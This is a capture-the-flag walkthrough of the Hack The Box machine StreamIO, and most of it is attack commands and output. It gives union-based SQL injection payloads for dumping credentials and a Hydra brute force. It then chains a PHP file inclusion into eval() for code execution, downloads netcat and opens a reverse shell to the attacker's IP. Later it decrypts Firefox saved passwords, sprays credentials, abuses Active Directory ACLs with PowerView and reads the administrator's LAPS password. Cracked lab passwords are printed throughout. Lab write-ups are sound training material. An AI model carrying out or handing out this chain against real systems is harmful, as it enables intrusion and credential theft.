


Nmap results:
```
┌──(glitch💀kali)-[~/…/HTB/labs/Machines/StreamIO]
└─$ sudo nmap -T4 -Pn 10.10.11.158                    
[sudo] password for glitch: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-02 13:25 EDT
Nmap scan report for 10.10.11.158
Host is up (0.53s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
443/tcp  open  https
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
```


trying to find the subdomain from the port 443:
```
┌──(glitch💀kali)-[~/…/HTB/labs/Machines/StreamIO]
└─$ ffuf -u https://10.10.11.158/ -H "Host: FUZZ.streamio.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -k -fs 0

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://10.10.11.158/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.streamio.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

watch                   [Status: 200, Size: 2829, Words: 202, Lines: 79, Duration: 927ms]
:: Progress: [4989/4989] :: Job [1/1] :: 17 req/sec :: Duration: [0:04:34] :: Errors: 0 ::
```


so the subdomain is: **watch.streamio.htb**




```
┌──(glitch💀kali)-[~/…/HTB/labs/Machines/StreamIO]
└─$ gobuster dir -u https://streamio.htb/admin/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -k 0 -x php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://streamio.htb/admin/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 403) [Size: 18]
/images               (Status: 301) [Size: 157] [--> https://streamio.htb/admin/images/]
/Images               (Status: 301) [Size: 157] [--> https://streamio.htb/admin/Images/]
/css                  (Status: 301) [Size: 154] [--> https://streamio.htb/admin/css/]
/Index.php            (Status: 403) [Size: 18]
/js                   (Status: 301) [Size: 153] [--> https://streamio.htb/admin/js/]
/master.php           (Status: 200) [Size: 58]
/fonts                (Status: 301) [Size: 156] [--> https://streamio.htb/admin/fonts/]
/IMAGES               (Status: 301) [Size: 157] [--> https://streamio.htb/admin/IMAGES/]
/INDEX.php            (Status: 403) [Size: 18]
/Fonts                (Status: 301) [Size: 156] [--> https://streamio.htb/admin/Fonts/]
/*checkout*           (Status: 400) [Size: 3420]
/CSS                  (Status: 301) [Size: 154] [--> https://streamio.htb/admin/CSS/]
/JS                   (Status: 301) [Size: 153] [--> https://streamio.htb/admin/JS/]
```


doing some directory enum, we found the following page that is only accessible through includes: 
https://streamio.htb/admin/master.php




```
┌──(glitch💀kali)-[~/…/HTB/labs/Machines/StreamIO]
└─$ gobuster dir -u https://watch.streamio.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -k 0 -x php       

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://watch.streamio.htb
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 2829]
/search.php           (Status: 200) [Size: 253887]
/static               (Status: 301) [Size: 157] [--> https://watch.streamio.htb/static/]
/Index.php            (Status: 200) [Size: 2829]
/Search.php           (Status: 200) [Size: 253887]
/INDEX.php            (Status: 200) [Size: 2829]
/*checkout*           (Status: 400) [Size: 3420]
Progress: 17469 / 441120 (3.96%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 17493 / 441120 (3.97%)
===============================================================
Finished
===============================================================

```


doing more enum, we found the search.php, in the following url: https://watch.streamio.htb/search.php seems to have SQLi veulnerability.




using SQLi to detect the number of cols:
![[Screenshot 2025-04-02 at 10.20.47 PM.png]]


so there are 6 cols, 
we are gonna now detect the version of the sql server:

![[Screenshot 2025-04-02 at 10.26.26 PM.png]]


we found that it uses MS SQL server, now let's try to dump the database, we are gonna use the payloads from the following resource: https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet


Getting the name of the database: STREAMIO

![[Screenshot 2025-04-02 at 10.32.28 PM.png]]



Now we are gonna enumerate the tables
Using the database name, we enumerate the tables, but since there are multiple tables we can utilize the

STRING_AGG function to join our results so that multiple entries are listed in a single row through the usage

of a delimiter, as mentioned in this link.

Let's compose a query that selects the correct amount of columns from the current table and add our

nested query into column 2 using STRING_AGG to join our results with the delimiter ,, which allows us to

dump each row in the table without multiple queries.


```
10' union select 1, (SELECT STRING_AGG(name, ',') name FROM STREAMIO..sysobjects WHERE xtype= 'U'),3,4,5,6-- -
```


and we got two tables, movies and users


now let's get the cols

```
10' UNION SELECT 1,name,3,4,5,6 FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'users')-- -
```


and we got the following cols:
![[Screenshot 2025-04-02 at 10.46.47 PM.png]]



Finally we can extract the credentials from the database using CONCAT to dump both the usernames and

passwords but divided by a space as shown in these https://www.mssqltips.com/sqlservertip/6991/sql-concatenate-examples/

```
10' union select 1,CONCAT(username, ' ', password),3,4,5,6 FROM users-- -
```


![[Screenshot 2025-04-02 at 10.50.35 PM.png]]


and we get those usernames with hashed passwords.

Now I'm gonna get the usernames and with crackable hashed and there passwords and same them in usernames, and passwords:

so we are gonna test the following hashes, to see which one is valid, using the following website: https://hashes.com/en/tools/hash_identifier
```
665a50ac9eaa781e4f7f04199db97a11
1c2b3d8270321140e5153f6637d3ee53
0049ac57646627b8d7aeaccf8b6a936f
3961548825e3e21df5646cafe11c6c76
54c88b2dbd7b1a84012fabc1a4c73415
22ee218331afd081b0dcd8115284bae3
2a4e2cf22dd8fcb45adcb91be1e22ae8
35394484d89fcfdb3c5e447fe749d213
ef8f3d30a856cf166fb8215aca93e9ff
ec33265e5fc8c2f1b0c137bb7b3632b5
8097cedd612cc37c29db152b6e9edbd3
0cfaaaafb559f081df2befbe66686de0
c660060492d9edcaa8332d89c99c9239
6dcd87740abb64edfa36d170f0d5450d
08344b85b329d7efd611b7a7743e8a09
ee0b8a0937abd60c2882eacb2f8dc49f
7df45a9e3de3863807c026ba48e55fb3
b83439b16f844bd6ffe35c02fe21b3c0
fd78db29173a5cf701bd69027cb9bf6b
f03b910e2bd0313a23fdd7575f34a694
dc332fb5576e9631c9dae83f194f8e70
f87d3c0d6c8fd686aacc6627f1f493a5
083ffae904143c4796e464dac33c1f7d
384463526d288edcc95fc3701e523bc7
3577c47eb1e12c8ba021611e1280753c
925e5408ecb67aea449373d668b7359e
bf55e15b119860a6e6b5a164377da719
b22abb47a02b52d5dfa27fb0b534f693
d62be0dc82071bccc1322d64ec5b6c51
b779ba15cedfd22a023c4d8bcf5f2332
```


```
##123a8j8w5123##
$monique$1991$
$hadoW
paddpadd
$3xybitch
!?Love?!123
physics69i
%$clara
!!sabrina$
aD2%1#pqz
!5psycho8!
66boysandgirls..
L3m0n@de
```

so we got those passwords, and I'm gonna save them in passwords.txt
we had also the following usernames.

and those are the following usernames:
```
admin
Alexendra
Austin
Barbra
Barry
Baxter
Bruno
Carmon
Clara
Diablo
Garfield
Gloria
James
Juliette
Lauren
Lenord
Lucifer
Michelle
Oliver
Robert
Robin
Sabrina
Samantha
Stan
Thane
Theodore
Victor
Victoria
William
yoshihide
```


We have a login page in http://streamio.htb/login.php
![[Screenshot 2025-04-02 at 11.38.30 PM.png]]

let's brute it with hydra

```
hydra -L users.txt -P passwords.txt streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=Login failed" -V -I -t 60
```

and boom, we got the following credentials:
```
yoshihide:66boysandgirls..
```

now let's login


we got the following admin panel, lets enum other parameters, since those parameters are useless
![[Screenshot 2025-04-02 at 11.56.11 PM.png]]



```
┌──(glitch💀kali)-[~/…/HTB/labs/Machines/StreamIO]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u https://streamio.htb/admin/?FUZZ= -b "PHPSESSID=eml4vgijrn5dade2aqmo6lb075" --fs 1678

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://streamio.htb/admin/?FUZZ=
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Header           : Cookie: PHPSESSID=eml4vgijrn5dade2aqmo6lb075
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1678
________________________________________________

debug                   [Status: 200, Size: 1712, Words: 90, Lines: 50, Duration: 255ms]
[WARN] Caught keyboard interrupt (Ctrl-C)

```

and boom we got debug



and boom, we got an attack vector, LFI
```
https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php
```

```
yr<?php
define('included',true);
session_start();
if(!isset($_SESSION['admin']))
{
	header('HTTP/1.1 403 Forbidden');
	die("<h1>FORBIDDEN</h1>");
}
$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
$handle = sqlsrv_connect('(local)',$connection);

?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Admin panel</title>
	<link rel = "icon" href="/images/icon.png" type = "image/x-icon">
	<!-- Basic -->
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<!-- Mobile Metas -->
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
	<!-- Site Metas -->
	<meta name="keywords" content="" />
	<meta name="description" content="" />
	<meta name="author" content="" />

<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>

	<!-- Custom styles for this template -->
	<link href="/css/style.css" rel="stylesheet" />
	<!-- responsive style -->
	<link href="/css/responsive.css" rel="stylesheet" />

</head>
<body>
	<center class="container">
		<br>
		<h1>Admin panel</h1>
		<br><hr><br>
		<ul class="nav nav-pills nav-fill">
			<li class="nav-item">
				<a class="nav-link" href="?user=">User management</a>
			</li>
			<li class="nav-item">
				<a class="nav-link" href="?staff=">Staff management</a>
			</li>
			<li class="nav-item">
				<a class="nav-link" href="?movie=">Movie management</a>
			</li>
			<li class="nav-item">
				<a class="nav-link" href="?message=">Leave a message for admin</a>
			</li>
		</ul>
		<br><hr><br>
		<div id="inc">
			<?php
				if(isset($_GET['debug']))
				{
					echo 'this option is for developers only';
					if($_GET['debug'] === "index.php") {
						die(' ---- ERROR ----');
					} else {
						include $_GET['debug'];
					}
				}
				else if(isset($_GET['user']))
					require 'user_inc.php';
				else if(isset($_GET['staff']))
					require 'staff_inc.php';
				else if(isset($_GET['movie']))
					require 'movie_inc.php';
				else 
			?>
		</div>
	</center>
</body>
</html>
```


we can now read the file that we have enumerated in the beginning of this attack which was under the /admin/ dir, with the name: **master.php**


and we got the following:

```
yr<h1>Movie managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
if(isset($_POST['movie_id']))
{
$query = "delete from movies where id = ".$_POST['movie_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from movies order by movie";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['movie']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST" action="?movie=">
				<input type="hidden" name="movie_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>Staff managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
$query = "select * from users where is_staff = 1 ";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
if(isset($_POST['staff_id']))
{
?>
<div class="alert alert-success"> Message sent to administrator</div>
<?php
}
$query = "select * from users where is_staff = 1";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['username']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST">
				<input type="hidden" name="staff_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<h1>User managment</h1>
<?php
if(!defined('included'))
	die("Only accessable through includes");
if(isset($_POST['user_id']))
{
$query = "delete from users where is_staff = 0 and id = ".$_POST['user_id'];
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
}
$query = "select * from users where is_staff = 0";
$res = sqlsrv_query($handle, $query, array(), array("Scrollable"=>"buffered"));
while($row = sqlsrv_fetch_array($res, SQLSRV_FETCH_ASSOC))
{
?>

<div>
	<div class="form-control" style="height: 3rem;">
		<h4 style="float:left;"><?php echo $row['username']; ?></h4>
		<div style="float:right;padding-right: 25px;">
			<form method="POST">
				<input type="hidden" name="user_id" value="<?php echo $row['id']; ?>">
				<input type="submit" class="btn btn-sm btn-primary" value="Delete">
			</form>
		</div>
	</div>
</div>
<?php
} # while end
?>
<br><hr><br>
<form method="POST">
<input name="include" hidden>
</form>
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>
```




The page master.php is accepting an include parameter, which is evaluating file contents. We can abuse

this to perform remote file inclusion from the file_get_contents() and achieve remote code execution

from eval().

Since we cannot directly access the functions unless the page is included from another page, we can use the
?debug= parameter in index.php to include master.php, which will in turn make a POST request to a
remote server and attempt to load a remote file through the usage of an include parameter.

Start Burp Suite, then capture a GET request to /admin/?debug=master.php and send the request to

repeater. Right click in the request and select Change request method so that the request will now be a

POST request and add a parameter called include pointing to your local IP address.


so I sent the following request:
```
POST /admin/?debug=master.p HTTP/2
Host: streamio.htb
Cookie: PHPSESSID=eml4vgijrn5dade2aqmo6lb075
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Upgrade-Insecure-Requests: 1

include=http://10.10.14.19/test.php
```

and it was executed:
```
┌──(glitch💀kali)-[~/…/HTB/labs/Machines/StreamIO]
└─$ sudo python3 -m http.server 80
[sudo] password for glitch: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
127.0.0.1 - - [02/Apr/2025 17:25:06] "GET /test.php HTTP/1.1" 200 -
10.10.14.19 - - [02/Apr/2025 17:25:57] "GET /test.php HTTP/1.1" 200 -
10.10.11.158 - - [02/Apr/2025 17:34:42] "GET /test.php HTTP/1.0" 200 -
```

We can attempt to grab Netcat from our local system and upload to the target using cURL. Stop the

Python web server and edit the test.php to the following syntax.

```
system("curl 10.10.14.23/nc64.exe -o c:\\windows\\temp\\nc64.exe");
```

Download Netcat and start the Python web server.

```
wget https://github.com/int0x33/nc.exe/raw/master/nc64.exe
```

```
sudo python3 -m http.server 80
```

Perform the include to test.php and verify that nc64.exe was collected from the target.

Change the contents of the test.php to make a connection back to our own Netcat listener.

```
system("c:\\windows\\temp\\nc64.exe 10.10.14.23 4444 -e cmd.exe");
```

Then start a Netcat listener locally.
```
nc -lnvp 4444
```

Finally send the request again and verify that you have gotten a shell.


```
┌──(glitch💀kali)-[~/…/HTB/labs/Machines/StreamIO]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.11.158] 60623
Microsoft Windows [Version 10.0.17763.2928]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\streamio.htb\admin>

```




Getting the db_admin password:


```
:\inetpub\streamio.htb\admin>type index.php
type index.php
<?php
define('included',true);
session_start();
if(!isset($_SESSION['admin']))
{
        header('HTTP/1.1 403 Forbidden');
        die("<h1>FORBIDDEN</h1>");
}
$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
```

db_admin:B1@hx31234567890

now we should connect to the MS SQL database to dump the data.
we first upgrade to powershell using the following command:

```
powershell
```

then we start dumping the database:

We need an application to connect to the MSSQL databases, so we search on Google for how to connect to MSSQL databases and find this article: https://stackoverflow.com/questions/22552102/how-to-connect-to-sql-server-from-command-prompt-with-windows-authentication which states that the SQLCMD executable can be used.

Using this application we attempt to retrieve the current database name and all the other database names.

```
sqlcmd -S "(local)" -U db_admin -P "B1@hx31234567890" -Q "SELECT DB_NAME(); SELECT name FROM master..sysdatabases;"
```


then we list the tables:

```
sqlcmd -S "(local)" -U db_admin -P "B1@hx31234567890" -Q "SELECT name FROM streamio_backup..sysobjects WHERE xtype = 'U';"
```


then, we dump the database:

```
sqlcmd -S "(local)" -U db_admin -P "B1@hx31234567890" -Q "USE streamio_backup; SELECT username, password FROM users;"
```



and we got the following :

```
username        | password hash
----------------|----------------------------------
nikk37          | 389d14cb8e4e9b94b137deb1caf0612a
yoshihide       | b779ba15cedfd22a023c4d8bcf5f2332
James           | c660060492d9edcaa8332d89c99c9239
Theodore        | 925e5408ecb67aea449373d668b7359e
Samantha        | 083ffae904143c4796e464dac33c1f7d
Lauren          | 08344b85b329d7efd611b7a7743e8a09
William         | d62be0dc82071bccc1322d64ec5b6c51
Sabrina         | f87d3c0d6c8fd686aacc6627f1f493a5

```



We start now enumerate the privileges of the users we have to choose the best user:

```
PS C:\inetpub\streamio.htb\admin> net user nikk37
net user nikk37
User name                    nikk37
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            2/22/2022 2:57:16 AM
Password expires             Never
Password changeable          2/23/2022 2:57:16 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   2/22/2022 3:39:51 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         
The command completed successfully.
```


and boom, nikk37 is one of the domain users.
let's crack it is password.

and we got the following credentials:
```
nikk37:get_dem_girls2@yahoo.com
```


now we pivot to nikk37:
```
evil-winrm -i streamio.htb -u nikk37 -p get_dem_girls2@yahoo.com
```



Now, time for priv esc using WinPEas:

```
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -O winpeas.exe
```

```
*Evil-WinRM* PS C:\Users\nikk37\Desktop> Invoke-WebRequest -Uri http://10.10.14.19:8000/winpeas.exe -OutFile C:\Users\nikk37\Documents\winpeas.exe
```



after running winpeas.exe, we got the following:
```
    Firefox credentials file exists at C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db

```

which satisfies that: the file  contains encrypted passwords stored in Firefox.




  
WinPEAS just dropped a **Firefox credentials file** on you:

```
C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\
│
├── key4.db   🔐
├── logins.json   🔐
```

  

---

**🧠 What This Means:**

  

Firefox stores **saved passwords** in:

• logins.json → contains encrypted usernames & passwords

• key4.db → contains the encryption key

  

If you have **both files**, you can decrypt **all saved Firefox credentials** 😈

---

**✅ Step-by-Step: Extract and Crack Firefox Passwords**

  

**🔹 1. Download both files via Evil-WinRM**

```
download "C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\logins.json"
download "C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db"
```



---

**🧠 🔹 2. On Kali, use firepwd (instead of firefox_decrypt)**

  

**✅ Clone the tool:**

```
git clone https://github.com/lclevy/firepwd
cd firepwd
```

  

---

**✅ Prepare the Firefox profile folder**

  

After downloading logins.json and key4.db from the target using Evil-WinRM:

```
download "C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\logins.json"
download "C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db"
```

Create the matching directory structure on your Kali machine:

```
mkdir -p ~/firefox_decrypt_profile/br53rxeg.default-release
mv logins.json key4.db ~/firefox_decrypt_profile/br53rxeg.default-release/
```

  

---

**✅ Install required Python modules:**

```
pip install pyasn1 pycryptodome
```

> ⚠️ Not Crypto — you must install pycryptodome, or decryption won’t work.

---

**✅ Run the tool:**

```
cd ~/firefox_decrypt_profile/br53rxeg.default-release/
python3 ~/firepwd/firepwd.py .
```

✅ The . tells the script to look in the current folder where logins.json and key4.db are.

---

**🔓 Result:**

  

You’ll get **cleartext saved credentials** like:

```
https://slack.streamio.htb:b'admin',b'JDg0dd1s@d0p3cr3@t0r'
https://slack.streamio.htb:b'nikk37',b'n1kk1sd0p3t00:)'
https://slack.streamio.htb:b'yoshihide',b'paddpadd@12'
https://slack.streamio.htb:b'JDgodd',b'password@12'

```

These can be used to access internal apps, portals, or reused elsewhere like WinRM, RDP, SMB, or MSSQL.


Now let's 
check which creds work using crackmapexec:

```
┌──(glitch💀kali)-[~/…/HTB/labs/Machines/StreamIO]
└─$ crackmapexec smb 10.10.11.158 -u usernames_system.txt -p passwords_system.txt
/usr/lib/python3/dist-packages/cme/cli.py:37: SyntaxWarning: invalid escape sequence '\ '
  formatter_class=RawTextHelpFormatter)
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence '\S'
  self.conn.execute_cmd("reg save HKLM\SAM C:\\windows\\temp\\SAM && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence '\S'
  self.conn.execute_cmd("reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:49: SyntaxWarning: invalid escape sequence '\p'
  stringbinding = 'ncacn_np:%s[\pipe\svcctl]' % self.__host
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:93: SyntaxWarning: invalid escape sequence '\{'
  command = self.__shell + 'echo '+ data + ' ^> \\\\127.0.0.1\\{}\\{} 2^>^&1 > %TEMP%\{} & %COMSPEC% /Q /c %TEMP%\{} & %COMSPEC% /Q /c del %TEMP%\{}'.format(self.__share_name, self.__output, self.__batchFile, self.__batchFile, self.__batchFile)
SMB         10.10.11.158    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:paddpadd@12 STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:password@12 STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:paddpadd@12 STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\nikk37:password@12 STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:paddpadd@12 STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:password@12 STATUS_LOGON_FAILURE 
SMB         10.10.11.158    445    DC               [+] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r 
```

and boom we got valid creds:
```
JDgodd:JDg0dd1s@d0p3cr3@t0r 
```



now let's discover the ACL using bloodhound:

We only find a valid login for SMB but fail to authenticate to any shares. We attempt to utilize BloodHound
to retrieve the ACLs within the active directory. Download the Python application, then install the
requirements and finally execute the bloodhound.py Python script to extract the ACLs of the Active
Directory.

```
git clone https://github.com/fox-it/BloodHound.py.git
cd BloodHound.py
python3 setup.py install
python3 bloodhound.py -d streamio.htb -u JDgodd -p 'JDg0dd1s@d0p3cr3@t0r' -gc dc.streamio.htb -ns 10.10.11.158 -c all
```




Now, let's start the bloodhound:

```
sudo neo4j console
```




![[Screenshot 2025-04-04 at 12.14.39 AM.png]]


And boom, this is our final path to the administrator,


We can see that the domain user JDgodd has WriteOwner over the group CORE STAFF and CORE STAFF have LAPS read ability on the domain controller, which will allow anyone in the CORE STAFF group to read the LAPS passwords for any user. To abuse this we need to add JDgodd to the CORE STAFF group and then request the LAPS password of the administrator.

Since we do not have access to the JDgodd account we need to use PowerShell to add JDgodd into the CORE STAFF group by utilizing PowerView. Download PowerView locally.


```
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
```



Through the Evil-WinRM session as nikk37, upload PowerView and add JDgodd to the CORE STAFF group, then verify that the user is in the group. Upload and import PowerView.ps1.

```
upload PowerView.ps1
./PowerView.ps1
```

Since we do not have a shell for JDgodd we can use PowerShell's

`System.Management.Automation.PSCredential` to store the credentials in our current shell.

```
$SecPassword = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('streamio.htb\JDgodd', $SecPassword)
```

As JDgodd has WriteOwner ACL attributed to their account, we can set JDgodd as the domain object owner of CORE STAFF using Set-DomainObjectOwner.

```
Set-DomainObjectOwner -Identity 'CORE STAFF' -OwnerIdentity JDgodd -Cred $cred
```

Grant all rights via the ACL with Add-DomainObjectACL.

```
Add-DomainObjectAcl -TargetIdentity "CORE STAFF" -PrincipalIdentity JDgodd -Cred $cred -Rights All
```

Use Add-DomainGroupMember to finally add JDgodd into the CORE STAFF group that they now own.

```
Add-DomainGroupMember -Identity 'CORE STAFF' -Members 'JDgodd' -Cred $cred
```

Verify that JDgodd is a part of CORE STAFF group.

```
net group 'CORE STAFF'
```



# ReadLAPSPassword 

This abuse can be carried out when controlling an object that has `GenericAll` or `AllExtendedRights` (or combination of `GetChanges` and (`GetChangesInFilteredSet` or `GetChangesAll`) for domain-wise synchronization) over the target computer configured for LAPS. The attacker can then read the LAPS password of the computer account (i.e. the password of the computer's local administrator).

We have confirmed that JDgodd is in the CORE STAFF group. We can now use the ldapsearch utility toextract the administrator password from LAPS. This link features a good explanation of this process.

```
ldapsearch -x -H ldap://streamio.htb -D "JDgodd@streamio.htb" -w 'JDg0dd1s@d0p3cr3@t0r' -b "CN=DC,CN=Computers,DC=streamio,DC=htb" ms-MCS-AdmPwd
```

and boooooom:
we got administrator password:


```
# DC, Domain Controllers, streamIO.htb
dn: CN=DC,OU=Domain Controllers,DC=streamIO,DC=htb
ms-Mcs-AdmPwd: @#+wc31iJ;)ZH%
```


login to administrator:

```
evil-winrm -i streamio.htb -u administrator -p '@#+wc31iJ;)ZH%'
